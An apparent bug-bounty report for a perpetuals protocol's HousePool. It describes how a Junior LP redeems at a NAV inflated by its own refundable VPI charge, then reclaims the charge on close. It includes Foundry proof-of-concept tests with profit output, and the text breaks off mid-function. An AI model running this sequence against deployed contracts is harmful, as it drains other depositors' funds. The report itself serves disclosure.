# \#97698 [SC-Critical] Junior LP can steal other Junior LPs' funds by redeeming at a NAV inflated with its own refundable VPI

**Submitted on Nov 2nd 2026 at 18:30:38 UTC by @AvrahamAdvisory for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97698
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Positive VPI paid when a position opens is booked straight into Junior NAV as revenue. That same VPI is paid back to
the trader when the position later closes and removes the skew it created. A Junior LP who also trades can therefore:
- open a large skew-increasing position right before its own redemption is funded;
- redeem at the inflated NAV;
- close the position and take the VPI back.

The remaining Junior LPs pay the refund. The price never moves and every call is public.

**Result:** at release parameters, 20 cycles (60 hours) take a victim's 1,000,000 USDG Junior position down to
889,864 USDG, while the attacker nets +74,571 USDG.

## Vulnerability Details

**On open, the whole trade cost is recorded as Junior revenue.** The trade cost is VPI plus fee, minus the protocol
fee credit
([CfdEngineSettlementSidecar.sol#L454-L464](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L464)):

```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }
}
```

**The redemption is then priced at the inflated NAV.** `settleLpEpoch` reconciles and immediately prices Junior
redemptions off the new `juniorPrincipal`
([HousePool.sol#L835-L841](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L841)).

**On close, the same VPI comes back.** A skew-reducing close gets a negative VPI delta, and its only limit is the
lifetime clamp
([CloseAccountingLib.sol#L107-L118](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L107-L118)):

```solidity
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

A position that unwinds its own skew ends with lifetime VPI of exactly zero, so the clamp lets the full charge be
paid back out of pool cash
([CfdEngineSettlementSidecar.sol#L621-L624](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624)).

**Nothing in the reconcile snapshot reserves this refundable amount.** An LP who leaves between the open and the
close takes its share of money the pool will have to give back.

The clamp's comment says it exists to stop LP sandwich attacks, and SECURITY.md says it "intentionally zeroes
otherwise extractable rebate-only round trips". This attack is an LP sandwich that never makes lifetime VPI
negative, so the clamp never stops it.

### Attack

**Setup.** Alice owns a share `s` of the Junior tranche and controls a second address, Alice2, that trades. Release
parameters, constant price.

1. After her deposit cooldown, Alice calls `juniorVault.requestRedeem` for all of her shares, before the 5-minute
   cutoff.
2. Two minutes before the epoch boundary, Alice2 calls `commitOrder` and then `executeOrder` for a LONG of about
   39% of pool depth. It pays VPI `c`, for example 8,215 USDG on 4.21M notional, and that VPI becomes Junior revenue.
3. After the boundary, anyone calls `OrderRouter.settleLpEpoch`. Alice's redemption is funded at the inflated NAV,
   so she receives about `s·c` more than her share is worth.
4. Alice2 closes the position. The close pays `c` back to Alice2 from pool cash.
5. Alice deposits again and repeats about every 3 hours (1 h cooldown, hourly epochs).

**Per cycle:**
- The other Junior LPs lose `s·c − closeFee`.
- Alice gains `s·c − 2·fee − carry`.

**Profitability.** At release parameters (4 bps fee, vpiFactor 0.01) the attack pays when
`s·(S0+S1)/D > 0.16`, where `S0` and `S1` are the skew before and after Alice's open and `D` is pool depth. That
means `s > 0.4` with no prior skew, and less when honest skew already exists. A share that large is easiest to get
while the Junior tranche is still small, for example shortly after launch.

## Impact Details

The impact is direct theft of the other Junior LPs' principal. It happens at a constant price and can be repeated.

| Scenario | Attacker | Victim |
|---|---|---|
| One cycle (victim Junior 1M, attacker Junior 4M, Senior 2M) | **+2,207.60 USDG** more than an honest exit | Junior marked **−3,320.49**; a 40% redemption pays **1,328.19 USDG** less |
| 20 cycles (attacker ≈ 86% of Junior, Senior 3.5M) | **+74,571.23 USDG** | 1,000,000 → **889,864.04 USDG** (−10.94%) |
| Pyth confidence at the release maximum (10 bps cap, 2,500 bps multiplier) | +1,369.11 | −2,482.56 |
| An LP who deposits in the attack epoch | — | 4,000,000 deposited, worth 3,996,453.11 after the cycle |

Senior is unaffected in every scenario.

### Why this is not a known item

- **Not the scan's "temporary pool liquidity" VPI findings.** Those are about depth sampling. In the depth-neutral
  control, a newcomer's deposit keeps depth at close at or above depth at open (7,003,141 vs 7,002,000). The clamp
  is never reached, and the attacker still gains +2,206.69.
- **Not the carry "LP ownership follows collection time" note.** Carry is never refunded; VPI is. That refund is
  why the remaining LPs end below principal.

The same mispricing also works on the entry side. A skew-reducing open pays a rebate out of NAV, while the clawback
sits in the VPI reserve outside NAV. This is included in the PoC only so the fix covers both directions.

## Recommendation

Keep the refundable part of collected VPI out of tranche NAV. Two ways to do it:
- Reserve `min(C(S) at current depth, Σ positive vpiAccrued of heavy-side positions)` and release it to LPs as the
  skew unwinds.
- Send positive VPI into a buffer that streams to LPs over time, like GMX v2's position impact pool.

Apply the same treatment to pending clawbacks when pricing Junior entries.

## References

- [CfdEngineSettlementSidecar.sol#L454-L464](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L464): VPI booked as Junior revenue.
- [CloseAccountingLib.sol#L107-L118](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L107-L118): the close rebate and the lifetime clamp.
- [CfdEngineSettlementSidecar.sol#L621-L624](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624): the rebate paid from pool cash.
- [HousePool.sol#L835-L841](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L841): redemption priced off the reconciled `juniorPrincipal`.


## Proof of Concept

## Proof of Concept

### Run instructions

1. Clone the competition repo at `a82d4fefb02768e5b3bddcc97dee371eee24fea8` and run `git submodule update --init --recursive`.
2. Save the three files below in `packages/perps/test/perps/`. They extend the repo's own `BasePerpTest`, and no in-scope contract is changed.
3. Run:

```bash
forge test --root packages/perps --match-path "test/perps/VpiNavRoundTrip*.t.sol" -vv
```

Each test runs the same timeline twice from one snapshot, first as an honest exit (CONTROL) and then with the attack (ATTACK). USDG has 6 decimals.

### Output

```
[PASS] test_vpiRoundTrip_noPriorSkew()
  VPI paid by attacker on open (6dp): 5558483290
  attacker net P&L vs funding CONTROL: -29236958
  attacker net P&L vs funding ATTACK : 2178362883
  victim junior marked value CONTROL: 999974426031
  victim junior marked value ATTACK : 996653939387
  victim junior USDG for 40% redeem CONTROL: 399982467918
  victim junior USDG for 40% redeem ATTACK : 398654275289
[PASS] test_ctrl_depthNeutral_newcomerSameEpoch()
  depth at open : 7002000000000
  depth at close: 7003141805949
  attacker gain vs control: 2206690987
  newcomer marked CONTROL: 3999999999999
  newcomer marked ATTACK : 3996453107934
[PASS] test_ctrl_releaseMaxConfidence()
  attacker gain vs control: 1369110156
  victim junior delta: -2482555610
[PASS] test_multiCycle_highShare()
  cycle 1 victim junior value CONTROL: 999927349060
  cycle 1 victim junior value ATTACK : 994529742389
  cycle 20 victim junior value CONTROL: 999185843925
  cycle 20 victim junior value ATTACK : 889864040303
  attacker net USDG (LP exit + trader cash - funding) CONTROL: -1103917119
  attacker net USDG (LP exit + trader cash - funding) ATTACK : 74571230696
```

### `VpiNavRoundTrip.t.sol` (single cycle, with and without prior honest skew)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice A Junior LP exits at a NAV inflated by its own skew-increasing VPI charge, then unwinds the position and
///         receives the same VPI back as a lifetime-clamp-permitted close rebate paid by the remaining Junior LPs.
///         Lifetime VPI of the attacker's position is exactly zero, so the lifetime clamp does not engage.
contract VpiNavRoundTripTest is BasePerpTest {

    address internal constant VICTIM_JUNIOR = address(0xA11CE);
    address internal constant VICTIM_SENIOR = address(0xB0B);
    address internal constant HONEST_TRADER = address(0xC0FFEE);
    address internal constant ATTACKER = address(0xBAD);
    address internal constant ATTACKER_TRADER = address(0xBAD2);
    address internal constant KEEPER = address(0xBEEF);

    uint256 internal constant VICTIM_JUNIOR_ASSETS = 1_000_000e6;
    uint256 internal constant VICTIM_SENIOR_ASSETS = 2_000_000e6;
    uint256 internal constant ATTACKER_LP_ASSETS = 4_000_000e6;
    uint256 internal constant TRADER_FUNDING = 100_000e6;
    uint256 internal constant TRADER_MARGIN = 60_000e6;

    /// @dev Checked-in release parameters from DEPLOYMENT.md (vpiFactor 0.01, maint 10 bps, init 20 bps).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    struct Outcome {
        uint256 attackerLpReceived;
        uint256 attackerTraderFinal;
        uint256 victimJuniorReceived;
        uint256 victimJuniorMarkedValue;
        uint256 vpiPaidOnOpen;
        uint256 juniorPrincipalAtSettlement;
    }

    /// @dev No pre-existing skew: attacker moves skew 0 -> ~40% of depth (27,900 lots = 2.79M USDG notional).
    function test_vpiRoundTrip_noPriorSkew() public {
        _compare(0, 2_790_000e18);
    }

    /// @dev Honest LONG skew of 1.4M already exists; attacker adds 1.39M on the same side.
    function test_vpiRoundTrip_withHonestSkew() public {
        _compare(1_400_000e18, 1_390_000e18);
    }

    function _compare(
        uint256 honestSize,
        uint256 attackSize
    ) internal {
        uint256 snap = vm.snapshotState();
        Outcome memory c = _run(honestSize, 0);
        vm.revertToState(snap);
        Outcome memory a = _run(honestSize, attackSize);

        int256 controlAttackerNet = int256(c.attackerLpReceived + c.attackerTraderFinal)
            - int256(ATTACKER_LP_ASSETS + TRADER_FUNDING);
        int256 attackAttackerNet = int256(a.attackerLpReceived + a.attackerTraderFinal)
            - int256(ATTACKER_LP_ASSETS + TRADER_FUNDING);

        emit log_named_uint("VPI paid by attacker on open (6dp)", a.vpiPaidOnOpen);
        emit log_named_uint("junior principal at settlement CONTROL", c.juniorPrincipalAtSettlement);
        emit log_named_uint("junior principal at settlement ATTACK ", a.juniorPrincipalAtSettlement);
        emit log_named_uint("attacker LP USDG received CONTROL", c.attackerLpReceived);
        emit log_named_uint("attacker LP USDG received ATTACK ", a.attackerLpReceived);
        emit log_named_uint("attacker trader USDG final CONTROL", c.attackerTraderFinal);
        emit log_named_uint("attacker trader USDG final ATTACK ", a.attackerTraderFinal);
        emit log_named_int("attacker net P&L vs funding CONTROL", controlAttackerNet);
        emit log_named_int("attacker net P&L vs funding ATTACK ", attackAttackerNet);
        emit log_named_uint("victim junior marked value CONTROL", c.victimJuniorMarkedValue);
        emit log_named_uint("victim junior marked value ATTACK ", a.victimJuniorMarkedValue);
        emit log_named_uint("victim junior USDG for 40% redeem CONTROL", c.victimJuniorReceived);
        emit log_named_uint("victim junior USDG for 40% redeem ATTACK ", a.victimJuniorReceived);

        assertGt(attackAttackerNet, 0, "attacker must be net profitable after all fees and carry");
        assertGt(attackAttackerNet, controlAttackerNet, "attack beats honest exit");
        assertLt(a.victimJuniorMarkedValue, c.victimJuniorMarkedValue, "victim junior is diluted");
        assertLt(a.victimJuniorReceived, c.victimJuniorReceived, "victim junior receives less USDG");
    }

    /// @dev Same timeline in both modes; only the attacker's open/close around its own redemption settlement differs.
    function _run(
        uint256 honestSize,
        uint256 attackSize
    ) internal returns (Outcome memory o) {
        // Release senior limits: 40M absolute, 80% share.
        _setSeniorCapacity(40_000_000e6, 8000);

        _fundJunior(VICTIM_JUNIOR, VICTIM_JUNIOR_ASSETS);
        _fundSenior(VICTIM_SENIOR, VICTIM_SENIOR_ASSETS);
        uint256 victimShares = juniorVault.balanceOf(VICTIM_JUNIOR);
        uint256 attackerShares = _fundJuniorDelayed(ATTACKER, ATTACKER_LP_ASSETS);

        // Optional pre-existing honest skew (stays open for the whole scenario).
        if (honestSize != 0) {
            _fundTrader(HONEST_TRADER, TRADER_FUNDING);
            vm.prank(HONEST_TRADER);
            uint64 honestId = router.commitOrder(CfdTypes.Side.LONG, honestSize, TRADER_MARGIN, 0, false);
            vm.prank(KEEPER);
            router.executeOrder(honestId, _mockPythUpdateData());
        }

        // Attacker cooldown, then queue a full redemption into the next epoch (ordinary request, before cutoff).
        vm.warp(juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN() + 1);
        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);

        _fundTrader(ATTACKER_TRADER, TRADER_FUNDING);
        if (attackSize != 0) {
            uint256 assetsBefore = pool.accountedAssets();
            // Skew-increasing open through the ordinary Router commit / permissionless execute path.
            vm.prank(ATTACKER_TRADER);
            uint64 openId = router.commitOrder(CfdTypes.Side.LONG, attackSize, TRADER_MARGIN, 0, false);
            vm.prank(KEEPER);
            router.executeOrder(openId, _mockPythUpdateData());
            (uint256 size,,,,,,) = engine.positions(ATTACKER_TRADER);
            assertEq(size, attackSize, "attack open must execute");
            o.vpiPaidOnOpen = pool.accountedAssets() - assetsBefore;
        }

        // Permissionless atomic LP settlement at the matured epoch (Router path, fresh post-boundary mark).
        vm.warp(pool.lpEpochStart(redeemId));
        router.settleLpEpoch(_mockPythUpdateData());
        o.juniorPrincipalAtSettlement = pool.juniorPrincipal();

        assertEq(juniorVault.claimableRedeemRequest(redeemId, ATTACKER), attackerShares, "attacker fully funded");
        uint256 balBefore = settlementToken.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        juniorVault.claimRedeem(redeemId, attackerShares, ATTACKER, ATTACKER);
        o.attackerLpReceived = settlementToken.balanceOf(ATTACKER) - balBefore;

        if (attackSize != 0) {
            // Unwind: skew-reducing close; lifetime VPI returns to exactly zero, so the full VPI is rebated by the Pool.
            vm.prank(ATTACKER_TRADER);
            uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, attackSize, 0, 0, true);
            vm.prank(KEEPER);
            router.executeOrder(closeId, _mockPythUpdateData());
            (uint256 sizeAfter,,,,,,) = engine.positions(ATTACKER_TRADER);
            assertEq(sizeAfter, 0, "attack close must execute");
        }
        o.attackerTraderFinal = clearinghouse.balanceAssets(ATTACKER_TRADER);
        vm.prank(ATTACKER_TRADER);
        clearinghouse.withdraw(ATTACKER_TRADER, o.attackerTraderFinal);
        assertEq(settlementToken.balanceOf(ATTACKER_TRADER), o.attackerTraderFinal, "trader cash withdrawn");

        // Victim junior LP marks its whole stake, then redeems 40% (the Senior covenant caps Junior exits at ~50%).
        o.victimJuniorMarkedValue = juniorVault.convertToAssets(victimShares);
        uint256 victimRedeemShares = (victimShares * 4) / 10;
        vm.prank(VICTIM_JUNIOR);
        uint256 victimRedeemId = juniorVault.requestRedeem(victimRedeemShares, VICTIM_JUNIOR, VICTIM_JUNIOR);
        vm.warp(pool.lpEpochStart(victimRedeemId));
        router.settleLpEpoch(_mockPythUpdateData());
        assertEq(
            juniorVault.claimableRedeemRequest(victimRedeemId, VICTIM_JUNIOR), victimRedeemShares, "victim funded"
        );
        uint256 victimBefore = settlementToken.balanceOf(VICTIM_JUNIOR);
        vm.prank(VICTIM_JUNIOR);
        juniorVault.claimRedeem(victimRedeemId, victimRedeemShares, VICTIM_JUNIOR, VICTIM_JUNIOR);
        o.victimJuniorReceived = settlementToken.balanceOf(VICTIM_JUNIOR) - victimBefore;
    }

}
```

### `VpiNavRoundTripControls.t.sol` (controls: depth-neutral, release-max confidence, Senior-majority)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

/// @notice Triage controls for VpiNavRoundTrip.t.sol.
///   1. depth-neutral: a newcomer Junior deposit activates in the SAME epoch as the attacker's exit, so pool depth at
///      the close is >= depth at the open. If the profit came from depth manipulation (scan items), it would vanish.
///   2. release adverse-confidence pricing (multiplier 2500, basket confidence ~10 bps = release maximum).
///   3. senior-majority pool + release-max confidence.
contract VpiNavRoundTripControlsTest is BasePerpTest {

    address internal constant VICTIM_JUNIOR = address(0xA11CE);
    address internal constant VICTIM_SENIOR = address(0xB0B);
    address internal constant NEWCOMER = address(0xD0D0);
    address internal constant ATTACKER = address(0xBAD);
    address internal constant ATTACKER_TRADER = address(0xBAD2);
    address internal constant KEEPER = address(0xBEEF);
    uint256 internal constant TRADER_FUNDING = 100_000e6;
    uint256 internal constant TRADER_MARGIN = 60_000e6;

    struct Cfg {
        uint256 victimJunior;
        uint256 victimSenior;
        uint256 attackerJunior;
        uint256 newcomerJunior;
        uint256 attackSize;
        uint64 conf;
    }

    struct Out {
        uint256 attackerLp;
        uint256 attackerTrader;
        uint256 victimMarked;
        uint256 newcomerMarked;
        uint256 vpiPaid;
        uint256 depthAtOpen;
        uint256 depthAtClose;
        int256 closeCashBack;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_ctrl_depthNeutral_newcomerSameEpoch() public {
        _compare(Cfg(1_000_000e6, 2_000_000e6, 4_000_000e6, 4_000_000e6, 2_790_000e18, 0));
    }

    function test_ctrl_releaseMaxConfidence() public {
        _compare(Cfg(1_000_000e6, 2_000_000e6, 4_000_000e6, 0, 2_790_000e18, 99_900));
    }

    function test_ctrl_seniorMajority_releaseMaxConfidence() public {
        _compare(Cfg(1_500_000e6, 4_000_000e6, 4_500_000e6, 0, 3_980_000e18, 99_900));
    }

    function _compare(
        Cfg memory cfg
    ) internal {
        uint256 snap = vm.snapshotState();
        Out memory c = _run(cfg, false);
        vm.revertToState(snap);
        Out memory a = _run(cfg, true);

        int256 cNet = int256(c.attackerLp + c.attackerTrader) - int256(cfg.attackerJunior + TRADER_FUNDING);
        int256 aNet = int256(a.attackerLp + a.attackerTrader) - int256(cfg.attackerJunior + TRADER_FUNDING);

        emit log_named_uint("VPI paid on open", a.vpiPaid);
        emit log_named_uint("depth at open ", a.depthAtOpen);
        emit log_named_uint("depth at close", a.depthAtClose);
        emit log_named_int("trader cash back at close (rebate - fees - carry)", a.closeCashBack);
        emit log_named_int("attacker net CONTROL", cNet);
        emit log_named_int("attacker net ATTACK ", aNet);
        emit log_named_int("attacker gain vs control", aNet - cNet);
        emit log_named_uint("victim junior marked CONTROL", c.victimMarked);
        emit log_named_uint("victim junior marked ATTACK ", a.victimMarked);
        emit log_named_int("victim junior delta", int256(a.victimMarked) - int256(c.victimMarked));
        if (cfg.newcomerJunior != 0) {
            emit log_named_uint("newcomer marked CONTROL", c.newcomerMarked);
            emit log_named_uint("newcomer marked ATTACK ", a.newcomerMarked);
            emit log_named_int("newcomer delta", int256(a.newcomerMarked) - int256(c.newcomerMarked));
            assertGe(a.depthAtClose, a.depthAtOpen, "close depth not reduced");
            assertLt(a.newcomerMarked, c.newcomerMarked, "newcomer diluted");
        } else {
            assertLt(a.victimMarked, c.victimMarked, "victim diluted");
        }
        assertGt(aNet, cNet, "attack beats honest exit");
        assertGt(aNet, 0, "attack net profitable");
    }

    function _px(
        uint64 conf
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(100_000_000), conf, int32(-8), publishTime, publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(uint256(1e8));
    }

    function _configure(
        uint64 conf
    ) internal {
        if (conf == 0) {
            _setSeniorCapacity(40_000_000e6, 8000);
            return;
        }
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.adverseConfidenceMultiplierBps = 2500;
        rc.basketMaxConfidenceRatioBps = 10;
        routerAdmin.proposeRouterConfig(rc);
        // Same fields as _setSeniorCapacity, proposed in the same block so one 72 h warp covers both timelocks.
        IHousePool.PoolConfig memory pc = _currentPoolConfig();
        pc.maxSeniorExposureAssets = 40_000_000e6;
        pc.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(pc);
        vm.warp(block.timestamp + 72 hours + 1);
        routerAdmin.finalizeRouterConfig();
        pool.finalizePoolConfig();
    }

    function _run(
        Cfg memory cfg,
        bool attack
    ) internal returns (Out memory o) {
        _configure(cfg.conf);

        _fundJunior(VICTIM_JUNIOR, cfg.victimJunior);
        _fundSenior(VICTIM_SENIOR, cfg.victimSenior);
        uint256 victimShares = juniorVault.balanceOf(VICTIM_JUNIOR);
        uint256 attackerShares = _fundJuniorDelayed(ATTACKER, cfg.attackerJunior);

        vm.warp(juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN() + 1);
        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);

        uint256 newcomerReq;
        if (cfg.newcomerJunior != 0) {
            settlementToken.mint(NEWCOMER, cfg.newcomerJunior);
            vm.startPrank(NEWCOMER);
            settlementToken.approve(address(juniorVault), cfg.newcomerJunior);
            newcomerReq = juniorVault.requestDeposit(cfg.newcomerJunior, NEWCOMER, NEWCOMER);
            vm.stopPrank();
            assertEq(juniorVault.depositEpochStart(newcomerReq), pool.lpEpochStart(redeemId), "same epoch");
        }

        _fundTrader(ATTACKER_TRADER, TRADER_FUNDING);
        if (attack) {
            o.depthAtOpen = pool.totalAssets();
            uint256 assetsBefore = pool.accountedAssets();
            vm.prank(ATTACKER_TRADER);
            uint64 openId = router.commitOrder(CfdTypes.Side.LONG, cfg.attackSize, TRADER_MARGIN, 0, false);
            vm.prank(KEEPER);
            router.executeOrder(openId, _px(cfg.conf));
            (uint256 size,,,,,,) = engine.positions(ATTACKER_TRADER);
            assertEq(size, cfg.attackSize, "open executed");
            o.vpiPaid = pool.accountedAssets() - assetsBefore;
        }

        vm.warp(pool.lpEpochStart(redeemId));
        router.settleLpEpoch(_px(cfg.conf));
        assertEq(juniorVault.claimableRedeemRequest(redeemId, ATTACKER), attackerShares, "attacker fully funded");
        uint256 balBefore = settlementToken.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        juniorVault.claimRedeem(redeemId, attackerShares, ATTACKER, ATTACKER);
        o.attackerLp = settlementToken.balanceOf(ATTACKER) - balBefore;

        uint256 newcomerShares;
        if (cfg.newcomerJunior != 0) {
            uint256 claimable = juniorVault.claimableDepositRequest(newcomerReq, NEWCOMER);
            assertEq(claimable, cfg.newcomerJunior, "newcomer activated in same settlement");
            vm.prank(NEWCOMER);
            newcomerShares = juniorVault.claimDeposit(newcomerReq, claimable, NEWCOMER, NEWCOMER);
        }

        if (attack) {
            o.depthAtClose = pool.totalAssets();
            uint256 traderBefore = clearinghouse.balanceAssets(ATTACKER_TRADER);
            vm.prank(ATTACKER_TRADER);
            uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, cfg.attackSize, 0, 0, true);
            vm.prank(KEEPER);
            router.executeOrder(closeId, _px(cfg.conf));
            (uint256 sizeAfter,,,,,,) = engine.positions(ATTACKER_TRADER);
            assertEq(sizeAfter, 0, "close executed");
            o.closeCashBack = int256(clearinghouse.balanceAssets(ATTACKER_TRADER)) - int256(traderBefore);
        }
        o.attackerTrader = clearinghouse.balanceAssets(ATTACKER_TRADER);
        vm.prank(ATTACKER_TRADER);
        clearinghouse.withdraw(ATTACKER_TRADER, o.attackerTrader);

        o.victimMarked = juniorVault.convertToAssets(victimShares);
        if (newcomerShares != 0) {
            o.newcomerMarked = juniorVault.convertToAssets(newcomerShares);
        }
    }

}
```

### `VpiNavRoundTripVariants.t.sol` (20 consecutive cycles, plus the entry-side mirror)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdMath} from "@plether/perps/CfdMath.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @dev Shared release parameters + helpers for the VPI-in-NAV variants.
abstract contract VpiVariantBase is BasePerpTest {

    address internal constant VICTIM_JUNIOR = address(0xA11CE);
    address internal constant VICTIM_SENIOR = address(0xB0B);
    address internal constant HONEST_TRADER = address(0xC0FFEE);
    address internal constant ATTACKER = address(0xBAD);
    address internal constant ATTACKER_TRADER = address(0xBAD2);
    address internal constant KEEPER = address(0xBEEF);

    /// @dev Checked-in release parameters (vpiFactor 0.01, maxSkew 0.4, maint 10 bps, init 20 bps).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// @dev Largest lot-aligned notional at `bps` of current net depth (price is constant 1.0, 1 lot = 100 USDG).
    function _sizeAtDepthFraction(
        uint256 bps
    ) internal view returns (uint256) {
        uint256 depth = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        uint256 notional = (depth * bps) / 10_000;
        return (notional / 100e6) * 1e20;
    }

    function _openVia(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        vm.prank(trader);
        uint64 id = router.commitOrder(side, size, margin, 0, false);
        vm.prank(KEEPER);
        router.executeOrder(id, _mockPythUpdateData());
        (uint256 sz,,,,,,) = engine.positions(trader);
        assertGe(sz, size, "open must execute");
    }

    function _closeVia(
        address trader,
        CfdTypes.Side side,
        uint256 size
    ) internal {
        vm.prank(trader);
        uint64 id = router.commitOrder(side, size, 0, 0, true);
        vm.prank(KEEPER);
        router.executeOrder(id, _mockPythUpdateData());
        (uint256 sz,,,,,,) = engine.positions(trader);
        assertEq(sz, 0, "close must execute");
    }

    function _depositAndClaim(
        address lp,
        uint256 assets
    ) internal returns (uint256 shares) {
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), assets);
        uint256 depId = juniorVault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(depId));
        router.settleLpEpoch(_mockPythUpdateData());
        uint256 claimable = juniorVault.claimableDepositRequest(depId, lp);
        assertEq(claimable, assets, "deposit activated");
        vm.prank(lp);
        shares = juniorVault.claimDeposit(depId, claimable, lp, lp);
    }

    function _redeemAllAfterCooldown(
        address lp
    ) internal returns (uint256 received) {
        uint256 readyAt = juniorVault.lastDepositTime(lp) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < readyAt) {
            vm.warp(readyAt);
        }
        uint256 shares = juniorVault.balanceOf(lp);
        vm.prank(lp);
        uint256 redeemId = juniorVault.requestRedeem(shares, lp, lp);
        vm.warp(pool.lpEpochStart(redeemId));
        router.settleLpEpoch(_mockPythUpdateData());
        assertEq(juniorVault.claimableRedeemRequest(redeemId, lp), shares, "redeem fully funded");
        uint256 before = settlementToken.balanceOf(lp);
        vm.prank(lp);
        juniorVault.claimRedeem(redeemId, shares, lp, lp);
        received = settlementToken.balanceOf(lp) - before;
    }

    function _victimRedeemFraction(
        uint256 victimShares,
        uint256 bps
    ) internal returns (uint256 received) {
        uint256 shares = (victimShares * bps) / 10_000;
        vm.prank(VICTIM_JUNIOR);
        uint256 id = juniorVault.requestRedeem(shares, VICTIM_JUNIOR, VICTIM_JUNIOR);
        vm.warp(pool.lpEpochStart(id));
        router.settleLpEpoch(_mockPythUpdateData());
        assertEq(juniorVault.claimableRedeemRequest(id, VICTIM_JUNIOR), shares, "victim funded");
        uint256 before = settlementToken.balanceOf(VICTIM_JUNIOR);
